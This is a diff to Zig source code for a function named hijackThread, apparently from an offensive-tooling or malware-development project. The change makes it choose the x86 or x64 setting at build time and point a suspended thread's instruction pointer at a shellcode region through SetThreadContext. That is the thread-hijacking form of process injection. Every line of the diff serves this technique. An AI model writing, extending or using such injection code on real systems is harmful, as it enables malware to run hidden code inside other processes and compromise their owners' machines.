@@ -1,11 +1,8 @@
 const std = @import("std");
 const win = @import("zigwin32").everything;
+const builtin = @import("builtin");
 
-// x86
-// const CONTEXT_CONTROL = 0x00010001;
-
-// x64
-const CONTEXT_CONTROL = 0x00100001;
+const CONTEXT_CONTROL = if (builtin.cpu.arch == .x86_64) 0x00100001 else 0x00010001;
 
 const HANDLE = win.HANDLE;
 const CONTEXT = win.CONTEXT;
@@ -37,11 +34,11 @@ pub fn hijackThread(h_thread: HANDLE, shell_code_region: *anyopaque, suspend_thr
         return error.GetThreadContextFailed;
     }
 
-    // X86
-    // thread_context.Eip = @intFromPtr(shell_code_region);
-
-    // X64
-    thread_context.Rip = @intFromPtr(shell_code_region);
+    if (builtin.cpu.arch == .x86_64) {
+        thread_context.Rip = @intFromPtr(shell_code_region);
+    } else {
+        thread_context.Eip = @intFromPtr(shell_code_region);
+    }
 
     if (SetThreadContext(h_thread, &thread_context) == 0) {
         std.debug.print("[!] SetThreadContext Failed With Error: {s}\n", .{@tagName(GetLastError())});
